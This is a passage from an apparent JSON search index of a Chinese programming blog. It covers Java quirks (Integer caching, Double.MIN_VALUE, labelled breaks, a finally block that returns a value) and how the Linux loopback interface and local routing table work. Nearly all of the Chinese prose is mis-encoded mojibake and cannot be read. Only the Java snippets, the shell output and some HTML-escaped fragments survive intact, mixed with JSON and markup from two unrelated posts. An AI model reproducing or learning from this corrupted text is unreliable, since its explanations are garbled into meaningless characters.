== i2); // false System.out.println(i4 == i3); // false Integer i1 = 127; Java åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç›´æ¥å°†ä»£ç ä¼˜åŒ–ä¸º Integer i1=Integer.valueOf(127);ï¼Œä»è€Œä½¿ç”¨å¸¸é‡æ± ä¸­çš„å¯¹è±¡ã€‚\nInteger i2 = Integer.valueOf(127); ä¼šä»Integerç¼“å­˜ä¸­è·å–ã€‚\nInteger.valueOfæºç å¦‚ä¸‹ã€‚\n/** * ä¼šä»ç¼“å­˜æ•°ç»„ä¸­è·å–èŒƒå›´ä¸º[-128, 127]çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚ */ public static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } Integer.parseInt(\u0026quot;127\u0026quot;); è¿”å›å€¼æ˜¯ intæ•°å­—ï¼Œåœ¨[-128, 127]èŒƒå›´çš„ä¼šä»å¸¸é‡æ± ä¸­è·å–ã€‚\nnew Integer(127); åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚\nIntegerå¯¹è±¡çš„ç¼“å­˜å€¼çš„å¤§å°èŒƒå›´æ˜¯åœ¨[-128 127]åŒºé—´ã€‚è¿™æ„å‘³ç€å½“æˆ‘ä»¬åœ¨æ­¤æ•°å€¼èŒƒå›´å†…æ“ä½œæ—¶ï¼Œâ€œ==â€æ¯”è¾ƒèƒ½æ­£å¸¸è¿”å›ç»“æœã€‚ä½†å½“æ•°å€¼ä¸åœ¨æ­¤èŒƒå›´ï¼Œå¯¹è±¡ç›¸ç­‰çš„æ¯”è¾ƒæ˜¯å¦æ­£å¸¸è¿”å›ç»“æœå°±å¾ˆéš¾è¯´äº†ã€‚æ‰€ä»¥ä¸ºäº†å®‰å…¨ï¼Œåœ¨ä½¿ç”¨å¯¹è±¡æ•°å€¼è¿›è¡Œæ¯”è¾ƒç›¸ç­‰æ—¶ï¼Œè¯·ä½¿ç”¨â€œ.equals()â€ï¼Œè€Œä¸æ˜¯ä¾èµ–äºâ€œ==â€æ¯”è¾ƒç›¸ç­‰ï¼Œé™¤éä½ éå¸¸è‚¯å®šè¿™ç§åšæ³•æ²¡æœ‰é”™è¯¯ã€‚\næ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œå½“å˜é‡çš„æ•°å€¼å‡ä¸º128æ—¶ä¼šè¾“å‡ºä»€ä¹ˆç»“æœå‘¢ï¼Ÿ\nDouble.MIN_VALUE ç«Ÿç„¶ä¸æ˜¯è´Ÿæ•°ï¼Ÿ æˆ‘ä»¬å¯èƒ½æ˜¯å—äº†å¤ªå¤šIntegerå’ŒLongçš„å½±å“ï¼Œç†æ‰€å½“ç„¶çš„è®¤ä¸ºDouble.MIN_VALUEåº”è¯¥æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œä½†å®é™…ä¸ŠDouble.MIN_VALUEæ˜¯é0éè´Ÿçš„æœ€å°å€¼4.9E-324ï¼ŒFloatä¹Ÿæ˜¯åŒæ ·ã€‚å¦‚æœä½ æƒ³è¦æœ€å°çš„Doubleç±»å‹çš„æ•°å­—ï¼Œè¯·ä½¿ç”¨-Double.MAX_VALUEã€‚\nSystem.out.println(Double.MAX_VALUE); // 1.7976931348623157E308 System.out.println(Double.MIN_VALUE); // 4.9E-324 System.out.println(Float.MAX_VALUE); // 3.4028235E38 System.out.println(Float.MIN_VALUE); // 1.4E-45 ä½¿ç”¨ for åšæ­»å¾ªç¯ï¼Ÿ æåˆ°æ­»å¾ªç¯å¤§å®¶éƒ½ä¼šæƒ³åˆ°while(true)ï¼Œä½†è¿˜æœ‰å¦ä¸€ç§å†™æ³• for(;;)ï¼Œåœ¨å­—èŠ‚ç å±‚é¢ä»–ä»¬ä¼šè¢«ç¼–è¯‘ä¸ºåŒæ ·çš„å†…å®¹ï¼Œä¸€äº›ä¸Šå¤C/C++ç¨‹åºå‘˜å†™Javaçš„æ—¶å€™è¿˜ä¼šä½¿ç”¨for(;;)åšæ­»å¾ªç¯ï¼Œé‡åˆ°è¿™æ ·çš„æœ‹å‹ä¸€å®šè¦çæƒœå“¦ã€‚\nwhile (true){ // do something } for(;;){ // do something } ä¸‹åˆ’çº¿ä¹Ÿèƒ½å½“åšå˜é‡ï¼Ÿ Object _ = new Object(); System.out.println(_.toString()); åœ¨Java8ä¸­è¿˜èƒ½ä½¿ç”¨ä¸‹åˆ’çº¿å½“åšå˜é‡ï¼Œä½†åœ¨Java9ä¹‹åå°±æ ‡è®°ä¸ºä¸å†æ”¯æŒï¼Œè¯·çæƒœå’Œå®ƒçš„æœ€åè¿™æ®µæ—¶å…‰å§ã€‚\nWTF!!! finallyè¿˜èƒ½è¿”å›å†…å®¹ï¼Ÿ public class Finally { public int fun() { try { return 0; } finally { return 1; } } public static void main(String[] args) { Finally aFinally = new Finally(); System.out.println(aFinally.fun()); // 1 } } é¢è¯•çš„æ—¶å€™finallyè¿”å›å€¼å‘äº†å¤šå°‘è‹±é›„å¥½æ±‰ï¼Ÿ\nä¸€ä¸ªç±»å¯ä»¥æœ‰å‡ ä¸ªstaticä»£ç å—ï¼Ÿ public class Static { static { System.out.println(\u0026#34;hello\u0026#34;); } static { System.out.println(\u0026#34;world\u0026#34;); } static { System.out.println(\u0026#34;java\u0026#34;); } public static void main(String[] args) { } } // è¾“å‡º hello world java JavağŸ‚ğŸº\nfinal ç±»å‹ä¸€å®šè¦å£°æ˜çš„æ—¶å€™è¿›è¡Œåˆå§‹åŒ–å—ï¼Ÿ å…³äºfinalç±»å‹çš„å˜é‡ä¸å¯ä¿®æ”¹æ˜¯æ¯ä¸€ä¸ªJavaå¼€å‘çš„å¸¸è¯†ï¼Œå£°æ˜å˜é‡çš„æ—¶å€™å°±è¦å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ï¼Œä½†çœŸçš„æ˜¯è¿™æ ·çš„å—ï¼Ÿ\npublic class Final { public static void main(String[] args) { final int a; if (args != null) { a = 0; } else { a = 1; } System.out.println(a); // 0 } } æ˜¯å¦æœ‰ç‚¹è¿èƒŒè®¤çŸ¥äº†ï¼Ÿ\n","permalink":"https://www.typesafe.cn/posts/java-unexpected-features/","summary":"\u003cp\u003e\u003cstrong\u003eJava\u003c/strong\u003eæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºç¼–ç¨‹è¯­è¨€ã€é¢å‘å¯¹è±¡ã€æ³›å‹ç¼–ç¨‹çš„ç‰¹æ€§ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šçº§Webåº”ç”¨å¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘ã€‚\u003c/p\u003e\n\u003cp\u003e1995å¹´3æœˆ23æ—¥\u003cstrong\u003eSun\u003c/strong\u003eå…¬å¸å‘å¸ƒäº†\u003cstrong\u003eJava\u003c/strong\u003eï¼Œè‡³ä»Šå·²æœ‰è¿‘26å¹´ï¼Œå¯ä»¥è¯´æ˜¯ä¸€é—¨ååˆ†æˆç†Ÿçš„å¼€å‘è¯­è¨€äº†ï¼Œä½†åœ¨æŸäº›ä¸ä¸ºäººçŸ¥çš„åœ°æ–¹å­˜åœ¨ç€ä¸€äº›æ„æ–™ä¹‹å¤–çš„ç‰¹æ€§ã€‚\u003c/p\u003e\n\u003ch3 id=\"javaçš„ä¿ç•™å…³é”®å­—-gotoå’Œconst\"\u003eJavaçš„ä¿ç•™å…³é”®å­— gotoå’Œconst\u003c/h3\u003e\n\u003cp\u003eåœ¨\u003cstrong\u003eJava\u003c/strong\u003eé‡Œé¢æ²¡æœ‰\u003ccode\u003egoto\u003c/code\u003eè¿™ä¸ªåŠŸèƒ½ï¼Œä½†å®ƒä½œä¸ºä¿ç•™å­—æ˜¯æ— æ³•å½“åšå˜é‡æ¥ä½¿ç”¨çš„ï¼Œ\u003ccode\u003econst\u003c/code\u003eä¹Ÿæ˜¯åŒæ ·ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003egoto\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e 0;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢è¿™ä¸¤è¡Œä»£ç çš„å†™æ³•å­˜åœ¨é—®é¢˜ï¼Œæ— æ³•æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚\u003c/p\u003e\n\u003ch3 id=\"javaæ ‡ç­¾label\"\u003eJavaæ ‡ç­¾Label\u003c/h3\u003e\n\u003cp\u003eä¸Šé¢è¯´äº†åœ¨\u003cstrong\u003eJava\u003c/strong\u003eé‡Œé¢æ²¡æœ‰\u003ccode\u003egoto\u003c/code\u003eè¿™ä¸ªåŠŸèƒ½ï¼Œä½†ä¸ºäº†å¤„ç†å¤šé‡å¾ªç¯å¼•å…¥äº†Labelï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨å¤šé‡å¾ªç¯ä¸­æ–¹ä¾¿çš„ä½¿ç”¨ break å’Œcoutinue ï¼Œä½†å¥½åƒåœ¨å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥ç”¨ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eouterLoop:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;I\u0026#39;m the outer loop\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e 0;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;I am the inner loop\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\ti\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (i \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e 3) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e outerLoop;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Complete the loop\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// è¾“å‡º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026#39;\u003c/span\u003em the outer loop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI am the inner loop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI am the inner loop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI am the inner loop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eComplete the loop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e test; \u003cspan style=\"color:#75715e\"\u003e// works\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  System.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;world\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// è¾“å‡º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehello\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e test; \u003cspan style=\"color:#75715e\"\u003e// works\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;world\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// è¾“å‡º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehello\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e test; \u003cspan style=\"color:#75715e\"\u003e// works\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tSystem.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;world\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e} \u003cspan style=\"color:#66d9ef\"\u003efinally\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// è¾“å‡º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehello\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜\"\u003eIntegerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜\u003c/h3\u003e\n\u003cp\u003eæ—¥å¸¸å¼€å‘ä½¿ç”¨åˆ°JavaåŸºæœ¬æ•°æ®ç±»å‹æ˜¯ä¸å¯é¿å…çš„ä¸€ä»¶äº‹ï¼Œä½†å®ƒå´åŒ…å«äº†ä¸€äº›å¾ˆå®¹æ˜“çŠ¯é”™çš„ç‚¹ï¼Œè¸©è¿‡ä¸€äº›å‘çš„åŒå­¦å¯èƒ½äº†è§£JavaåŸºæœ¬åŒ…è£…ç±»å‹çš„å¸¸é‡æ± æŠ€æœ¯ï¼Œä¾‹å¦‚\u003ccode\u003eInteger\u003c/code\u003eå°±å…·æœ‰æ•°å€¼\u003ccode\u003e[-128ï¼Œ127] \u003c/code\u003eçš„ç›¸åº”ç±»å‹çš„ç¼“å­˜æ•°æ®ï¼Œä½†ä¸‹é¢å®šä¹‰çš„4ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ä½ æ˜¯å¦èƒ½è¯´çš„å‡ºæ¥å‘¢ï¼Ÿ\u003c/p\u003e","title":"Javaçš„å¥‡æŠ€æ·«å·§"},{"content":"åœ¨å¼€å‘æˆ–è€…è°ƒè¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å’Œæœ¬åœ°çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚å¯åŠ¨nginxä¹‹åï¼Œåœ¨æµè§ˆå™¨è¾“å…¥lcoalhostæˆ–è€…127.0.0.1å°±å¯ä»¥è®¿é—®åˆ°æœ¬æœºä¸Šé¢çš„httpæœåŠ¡ã€‚\nLinuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºIPçš„ï¼Ÿ å¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½åœ¨ç½‘ç»œå±‚å®ç°äº†ç¯å›èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£æ¥å®ç°ã€‚è¿™ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£çœ‹ç€åƒæ˜¯ä¸€ä¸ªçœŸå®çš„ç½‘å¡ï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„ï¼Œå®ƒå¯ä»¥é€šè¿‡TCP/IPä¸åŒä¸€å°ä¸»æœºä¸Šçš„å…¶ä»–æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œä»¥127å¼€å¤´çš„IPv4åœ°å€å°±æ˜¯ä¸ºå®ƒä¿ç•™çš„ï¼Œä¸»æµLinuxæ“ä½œç³»ç»Ÿä¸ºç¯å›ç½‘å¡åˆ†é…çš„åœ°å€éƒ½æ˜¯127.0.0.1ï¼Œä¸»æœºåæ˜¯localhostã€‚\nç¯å›ç½‘ç»œæ¥å£ä¹‹æ‰€ä»¥è¢«ç§°ä¹‹ä¸ºç¯å›ç½‘ç»œæ¥å£ï¼Œæ˜¯å› ä¸ºä»æœ¬æœºå‘é€åˆ°æœ¬æœºä»»æ„ä¸€ä¸ªIPçš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šåœ¨ç½‘ç»œå±‚äº¤ç»™ç¯å›ç½‘ç»œæ¥å£ï¼Œä¸å†ä¸‹å‘åˆ°æ•°æ®é“¾è·¯å±‚è¿›è¡Œå¤„ç†ï¼Œç¯å›ç½‘ç»œæ¥å£ç›´æ¥å‘é€å›ç½‘ç»œå±‚ï¼Œæœ€ç»ˆäº¤ç”±åº”ç”¨å±‚è½¯ä»¶ç¨‹åºè¿›è¡Œå¤„ç†ã€‚è¿™ç§æ–¹å¼å¯¹äºæ€§èƒ½æµ‹è¯•éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºçœå»äº†ç¡¬ä»¶çš„å¼€é”€ï¼Œå¯ä»¥ç›´æ¥æµ‹è¯•åè®®æ ˆè½¯ä»¶æ‰€éœ€è¦çš„æ—¶é—´ã€‚\né‚£ç¯å›ç½‘ç»œæ¥å£æ˜¯å¦‚ä½•åˆ¤æ–­ç›®çš„IPæ˜¯å¦ä¸ºæœ¬æœºåœ°å€çš„å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ç½‘ç»œå±‚åœ¨è¿›è¡Œè·¯ç”±è½¬å‘çš„æ—¶å€™ä¼šå…ˆæŸ¥æœ¬åœ°çš„è·¯ç”±è¡¨ï¼Œå‘ç°æ˜¯æœ¬æœºIPåäº¤ç»™ç¯å›ç½‘ç»œæ¥å£ã€‚æŸ¥çœ‹æœ¬åœ°è·¯ç”±è¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š\nip route show table local è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š\nbroadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 local 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 å…¶ä¸­localå¼€å¤´çš„ä¾¿æ˜¯æœ¬åœ°IPï¼Œdevåé¢æ˜¯ç½‘å¡åç§°ã€‚\næŸ¥å®Œäº†æœ¬åœ°è·¯ç”±è¡¨ä¹‹åä¼šå†æŸ¥ä¸»è·¯ç”±è¡¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸æ“ä½œçš„è·¯ç”±è¡¨ã€‚\nip route show table main è¾“å‡ºå†…å®¹å¦‚ä¸‹\ndefault via 10.141.128.1 dev eth0 proto static metric 100 10.141.128.0/18 dev eth0 proto kernel scope link src 10.141.155.131 metric 100 ç¯å›ç½‘ç»œæ¥å£ ç°åœ¨æˆ‘ä»¬å†æ¥çœ‹ä¸‹ç¯å›ç½‘ç»œæ¥å£\nifconfig lo è¾“å‡º\nlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 1554227 bytes 123327716 (117.6 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1554227 bytes 123327716 (117.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 å¯ä»¥çœ‹åˆ°æœ¬åœ°ç¯å›æ¥å£çš„IPv4åœ°å€æ˜¯127.0.0.1ï¼Œå­ç½‘æ©ç æ˜¯255.0.0.0ï¼Œå¯¹åº”Aç±»ç½‘ç»œå·127ï¼Œæœ‰è¶£çš„æ˜¯å½“æˆ‘ä»¬è®¿é—® 127.0.0.1-127.255.255.254ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªåœ°å€éƒ½ä¼šè®¿é—®åˆ°æœ¬æœºã€‚\nIPv6åœ°å€::1ï¼Œå‰ç¼€æ˜¯128ä½ï¼Œè¡¨ç¤ºåªæœ‰ä¸€ä¸ªåœ°å€ã€‚\nç¯å›ç½‘ç»œæ¥å£çš„å½“å‰MTUæ˜¯64KBï¼Œä¸è¿‡æœ€é«˜å¯ä»¥è®¾ç½®åˆ°2GBï¼ŒçœŸæ˜¯ææ€–å¦‚æ–¯ã€‚\nä¸‹é¢å‡ æ¡RX,TXå¼€å¤´çš„åˆ†åˆ«ä»£è¡¨æ”¶å‘åˆ°çš„æ•°æ®æŠ¥æ–‡ä¸ªæ•°å’Œå¤§å°ä»¥åŠé”™åŒ…ã€ä¸¢åŒ…ã€æº¢å‡ºæ¬¡æ•°å’Œæ— æ•ˆå¸§ã€‚\nFAQ 